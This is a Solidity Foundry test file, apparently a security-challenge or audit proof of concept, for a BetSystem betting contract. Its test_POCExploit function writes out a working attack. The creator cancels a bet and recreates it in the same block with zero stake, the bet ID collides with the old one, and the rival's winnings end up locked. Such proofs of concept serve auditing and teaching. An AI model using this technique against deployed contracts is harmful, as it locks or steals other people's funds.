// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import "src/BetSystem.sol";

contract ExploitPoc is Test {

    BetSystem betSystem;

    address deployer = vm.addr(1); // System owner: use this account to submit the final game result
    address betCreator = vm.addr(2); // Bet creator: use this account to create a bet
    address betRival = vm.addr(3); // Bet rival: use this account to bet agaisnt betCreator

    function setUp() public {

        // Send 5 Ether to betters
        vm.deal(betCreator, 5 ether);
        vm.deal(betRival, 5 ether);

        vm.startPrank(deployer);
        betSystem = new BetSystem();
        vm.stopPrank();
    }

    function test_CorrectWorkingOfBetSystem() public {

        // Create bet
        vm.startPrank(betCreator);
        uint256 betAmount = 1 ether;
        uint256 allowedGameNumber = 0;
        BetSystem.BetResult gameResult = BetSystem.BetResult.WinTeam0;
        uint256 endTime = block.timestamp + 24 hours;

        bytes32 betId = betSystem.designBet{value: betAmount}(betAmount, allowedGameNumber, gameResult, endTime);
        BetSystem.BetStatus betStatus = betSystem.betStatus(betId);
        assert(betId != bytes32(0));
        assert(betStatus == BetSystem.BetStatus.Created);
        vm.stopPrank();

        // Rival bets agaisnt
        vm.startPrank(betRival);
        BetSystem.BetResult rivalGameResult = BetSystem.BetResult.WinTeam1;
        
        vm.warp(block.timestamp + 10 minutes);
        betSystem.betAgaisnt{value: betAmount}(betId, rivalGameResult);

        BetSystem.BetResult betRivalResult = betSystem.betRivalResult(betId);
        BetSystem.BetStatus betStatus2 = betSystem.betStatus(betId);
        assert(rivalGameResult == betRivalResult);
        assert(betStatus2 == BetSystem.BetStatus.Accepted);
        vm.stopPrank();

        // Finalizes the bet and rival wins
        vm.startPrank(deployer);
        BetSystem.BetResult finalGameResult = BetSystem.BetResult.WinTeam1;

        uint256 creatorBalanceBefore = address(betCreator).balance;
        uint256 rivalBalanceBefore = address(betRival).balance;
        vm.warp(block.timestamp + 24 hours); // Move to endTime timestamp
        betSystem.resolvedBet(betId, finalGameResult);
        uint256 creatorBalanceAfter = address(betCreator).balance;
        uint256 rivalBalanceAfter = address(betRival).balance;

        uint256 betTotalAmount = betSystem.betCreatorAmount(betId) + betSystem.betRivalAmount(betId);
        assert(creatorBalanceAfter == creatorBalanceBefore);
        assert(rivalBalanceAfter == rivalBalanceBefore + betTotalAmount);
        vm.stopPrank();
    }

    function test_POCExploit() public {
        // *** Exploit code here***

        // Create bet
        vm.startPrank(betCreator);
        uint256 betAmount = 1 ether;
        uint256 allowedGameNumber = 0;
        BetSystem.BetResult gameResult = BetSystem.BetResult.WinTeam0;
        uint256 endTime = block.timestamp + 24 hours;

        bytes32 betId = betSystem.designBet{value: betAmount}(betAmount, allowedGameNumber, gameResult, endTime);
        BetSystem.BetStatus betStatus = betSystem.betStatus(betId);
        assert(betId != bytes32(0));
        assert(betStatus == BetSystem.BetStatus.Created);

        // EXPLOIT HERE:
        // Cancel the bet
        uint256 amountBeforeCancelling = address(betCreator).balance;
        betSystem.cancelBet(betId);
        uint256 amountAfterCancelling = address(betCreator).balance;
        assert(amountAfterCancelling == amountBeforeCancelling + betAmount);

        // Create the bet again but now sending 0 ether
        bytes32 betId2 = betSystem.designBet{value: 0}(0, allowedGameNumber, gameResult, endTime);
        assert(betId2 == betId); // The new betId is equal to the old one because they have been created - cancelled - created within the same block.   
                                 // As a result, the bet data for the amount is still set to 1 ether, however the actual amount is 0 as it was transferred to the created when cancelled
        vm.stopPrank();

        // Rival bets agaisnt
        vm.startPrank(betRival);
        BetSystem.BetResult rivalGameResult = BetSystem.BetResult.WinTeam1;
        
        vm.warp(block.timestamp + 10 minutes);
        betSystem.betAgaisnt{value: betAmount}(betId, rivalGameResult);

        BetSystem.BetResult betRivalResult = betSystem.betRivalResult(betId);
        BetSystem.BetStatus betStatus2 = betSystem.betStatus(betId);
        assert(rivalGameResult == betRivalResult);
        assert(betStatus2 == BetSystem.BetStatus.Accepted);
        vm.stopPrank();

        // **DO NOT CHANGE - FINAL CONDITIONS FOR EXPLOIT**
        // Finalizes the bet and rival wins but funds are locked
        vm.startPrank(deployer);
        BetSystem.BetResult finalGameResult = BetSystem.BetResult.WinTeam1;
        vm.warp(block.timestamp + 24 hours); // Move to endTime timestamp
        vm.expectRevert("Transfer failed"); // Tries to transfer 2 ether but only 1 ether is in the contract (the ether bet by the rival)
        betSystem.resolvedBet(betId, finalGameResult);
        vm.stopPrank();
    }
}